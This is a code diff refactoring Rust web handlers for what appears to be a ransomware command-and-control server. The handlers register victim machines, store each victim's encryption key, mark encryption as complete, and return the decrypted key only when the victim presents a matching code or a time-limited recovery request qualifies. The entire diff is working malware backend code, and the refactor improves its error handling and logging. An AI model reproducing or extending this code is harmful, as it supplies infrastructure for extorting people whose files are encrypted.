@@ -1,27 +1,32 @@
-use axum::{extract::State, http::StatusCode};
-use log::{debug, error, info, warn};
+use std::sync::Arc;
+
+use axum::extract::State;
+use coconut_crab_lib::web::{
+    codes::RECOVERY_REQUEST_CODE,
+    responses::ServerResponse,
+    structs::{AnnounceCompletion, DownloadSymKey, Registration, UploadSymKey},
+};
 use purecrypto::ct::{Choice, ConstantTimeEq};
+use tracing::{debug, error, info, warn};
 
 use crate::{
     AppState, config,
     crypto::{decrypt_key, generate_code},
-    extract::Validated,
+    extract::{ApiError, Validated},
     models::Victim,
-    time::{get_epoch_time, is_recovery_valid},
-};
-use coconut_crab_lib::web::{
-    codes::RECOVERY_REQUEST_CODE,
-    structs::{AnnounceCompletion, DownloadSymKey, Registration, UploadSymKey},
+    time::{epoch_time, is_recovery_valid},
 };
 
+#[tracing::instrument(skip_all, fields(id = %registration.id))]
 pub async fn register(
     State(state): State<AppState>,
     Validated(registration): Validated<Registration>,
-) -> Result<&'static str, (StatusCode, &'static str)> {
+) -> Result<&'static str, ApiError> {
     let mut db = state.db.clone();
+    let id = registration.id.as_str().to_owned();
 
-    info!("[{}] Adding New Victim", registration.id);
-    let inserted = Victim::upsert_by_id(registration.id.clone())
+    info!("Adding new victim");
+    let inserted = Victim::upsert_by_id(&id)
         .on_create(|victim| {
             victim
                 .hostname(registration.hostname.clone())
@@ -36,130 +41,118 @@ pub async fn register(
     match inserted {
         Ok(Some(_)) => {
             debug!("Inserted new victim into database");
-            Ok("Success")
+            Ok(ServerResponse::Success.as_str())
         }
         Ok(None) => {
-            warn!(
-                "[{}] Existing Victim Found (duplicate key)",
-                registration.id
-            );
-            Err((StatusCode::CONFLICT, "Victim already exists"))
+            warn!("Existing victim found (duplicate key)");
+            Err(ApiError::VictimExists)
         }
         Err(error) => {
-            error!("[{}] Failed to insert victim: {error}", registration.id);
-            Err((StatusCode::INTERNAL_SERVER_ERROR, "Database error"))
+            error!(error = ?error, "Failed to insert victim");
+            Err(ApiError::Database)
         }
     }
 }
 
-fn db_lookup_error(id: &str, action: &str, error: &toasty::Error) -> (StatusCode, &'static str) {
+fn db_lookup_error(action: &str, error: &toasty::Error) -> ApiError {
     if error.is_record_not_found() {
-        warn!("[{id}] Existing Victim Not Found, cannot {action}");
-        (StatusCode::NOT_FOUND, "Victim does not exist")
+        warn!("Existing victim not found, cannot {action}");
+        ApiError::VictimNotFound
     } else {
-        error!("[{id}] Database error during {action}: {error}");
-        (StatusCode::INTERNAL_SERVER_ERROR, "Database error")
+        error!(error = ?error, "Database error during {action}");
+        ApiError::Database
     }
 }
 
+#[tracing::instrument(skip_all, fields(id = %upload_sym_key.id))]
 pub async fn upload_sym_key(
     State(state): State<AppState>,
     Validated(upload_sym_key): Validated<UploadSymKey>,
-) -> Result<&'static str, (StatusCode, &'static str)> {
+) -> Result<&'static str, ApiError> {
     let mut db = state.db.clone();
+    let id = upload_sym_key.id.as_str().to_owned();
 
-    let mut victim = match Victim::get_by_id(&mut db, &upload_sym_key.id).await {
+    let mut victim = match Victim::get_by_id(&mut db, &id).await {
         Ok(victim) => victim,
         Err(error) => {
-            return Err(db_lookup_error(
-                &upload_sym_key.id,
-                "upload symmetric key",
-                &error,
-            ));
+            return Err(db_lookup_error("upload symmetric key", &error));
         }
     };
 
     let code = generate_code();
-    let Some(upload_time) = get_epoch_time() else {
-        error!("[{}] Cannot determine current time", upload_sym_key.id);
-        return Err((StatusCode::INTERNAL_SERVER_ERROR, "Database error"));
+    let Some(upload_time) = epoch_time() else {
+        error!("Cannot determine current time");
+        return Err(ApiError::TimeUnavailable);
     };
 
-    if let Err(err) = toasty::update!(victim {
-        key: Some(upload_sym_key.key.clone()),
-        code: Some(code.clone()),
+    if let Err(error) = toasty::update!(victim {
+        key: Some(upload_sym_key.key.as_str().to_owned()),
+        code: Some(code),
         upload_time: Some(upload_time),
     })
     .exec(&mut db)
     .await
     {
-        error!("[{}] Failed to update victim: {err}", upload_sym_key.id);
-        return Err((StatusCode::INTERNAL_SERVER_ERROR, "Database error"));
+        error!(error = ?error, "Failed to update victim");
+        return Err(ApiError::Database);
     }
 
-    info!("[{}] Added Symmetric Key", upload_sym_key.id);
-    info!("[{}] Added Upload Time: {}", upload_sym_key.id, upload_time);
+    info!("Added symmetric key");
+    info!("Added upload time: {upload_time}");
 
-    Ok("Success")
+    Ok(ServerResponse::Success.as_str())
 }
 
+#[tracing::instrument(skip_all, fields(id = %announce_completion.id))]
 pub async fn announce_completion(
     State(state): State<AppState>,
     Validated(announce_completion): Validated<AnnounceCompletion>,
-) -> Result<&'static str, (StatusCode, &'static str)> {
+) -> Result<&'static str, ApiError> {
     let mut db = state.db.clone();
+    let id = announce_completion.id.as_str().to_owned();
 
-    let mut victim = match Victim::get_by_id(&mut db, &announce_completion.id).await {
+    let mut victim = match Victim::get_by_id(&mut db, &id).await {
         Ok(victim) => victim,
         Err(error) => {
-            return Err(db_lookup_error(
-                &announce_completion.id,
-                "announce completion",
-                &error,
-            ));
+            return Err(db_lookup_error("announce completion", &error));
         }
     };
 
-    info!("[{}] Designating As Complete", announce_completion.id);
-    if let Err(err) = toasty::update!(victim { complete: true })
+    info!("Designating as complete");
+    if let Err(error) = toasty::update!(victim { complete: true })
         .exec(&mut db)
         .await
     {
-        error!(
-            "[{}] Failed to update victim completion: {err}",
-            announce_completion.id
-        );
-        return Err((StatusCode::INTERNAL_SERVER_ERROR, "Database error"));
+        error!(error = ?error, "Failed to update victim completion");
+        return Err(ApiError::Database);
     }
 
-    Ok("Success")
+    Ok(ServerResponse::Success.as_str())
 }
 
+#[tracing::instrument(skip_all, fields(id = %download_sym_key.id))]
 pub async fn download_sym_key(
     State(state): State<AppState>,
     Validated(download_sym_key): Validated<DownloadSymKey>,
-) -> Result<String, (StatusCode, &'static str)> {
+) -> Result<String, ApiError> {
     let mut db = state.db.clone();
+    let id = download_sym_key.id.as_str().to_owned();
 
-    let existing_victim = match Victim::get_by_id(&mut db, &download_sym_key.id).await {
+    let existing_victim = match Victim::get_by_id(&mut db, &id).await {
         Ok(victim) => victim,
         Err(error) => {
-            return Err(db_lookup_error(
-                &download_sym_key.id,
-                "download symmetric key",
-                &error,
-            ));
+            return Err(db_lookup_error("download symmetric key", &error));
         }
     };
 
     let recovery_valid =
-        if !existing_victim.complete && download_sym_key.code == RECOVERY_REQUEST_CODE {
-            info!("[{}] Key Recovery Requested", download_sym_key.id);
+        if !existing_victim.complete && download_sym_key.code.as_str() == RECOVERY_REQUEST_CODE {
+            info!("Key recovery requested");
             let valid = is_recovery_valid(existing_victim.upload_time, existing_victim.complete);
             if valid {
-                info!("[{}] Key Recovery Valid", download_sym_key.id);
+                info!("Key recovery valid");
             } else {
-                warn!("[{}] Key Recovery Not Valid", download_sym_key.id);
+                warn!("Key recovery not valid");
             }
             valid
         } else {
@@ -175,14 +168,25 @@ pub async fn download_sym_key(
             .ct_eq(download_sym_key.code.as_bytes())
         | Choice::from(u8::from(recovery_valid));
     if bool::from(authorized) {
-        info!("[{}] Correct Code provided", download_sym_key.id);
-        info!("[{}] Providing Decrypted Key", download_sym_key.id);
+        info!("Correct code provided");
+        info!("Providing decrypted key");
         let Some(stored_key) = existing_victim.key.as_deref() else {
-            warn!("[{}] Victim has no uploaded key", download_sym_key.id);
-            return Err((StatusCode::NOT_FOUND, "Key not uploaded"));
+            warn!("Victim has no uploaded key");
+            return Err(ApiError::KeyNotUploaded);
         };
-        return decrypt_key(&state.private_key, stored_key);
+        let private_key = Arc::clone(&state.private_key);
+        let stored_key = stored_key.to_owned();
+        return match tokio::task::spawn_blocking(move || decrypt_key(&private_key, &stored_key))
+            .await
+        {
+            Ok(Ok(key)) => Ok(key),
+            Ok(Err(rejection)) => Err(rejection),
+            Err(join_error) => {
+                error!(error = ?join_error, "Decryption task failed");
+                Err(ApiError::DecryptionFailed)
+            }
+        };
     }
-    warn!("[{}] Incorrect Code provided", download_sym_key.id);
-    Err((StatusCode::FORBIDDEN, "Invalid Code"))
+    warn!("Incorrect code provided");
+    Err(ApiError::UnauthorizedCode)
 }
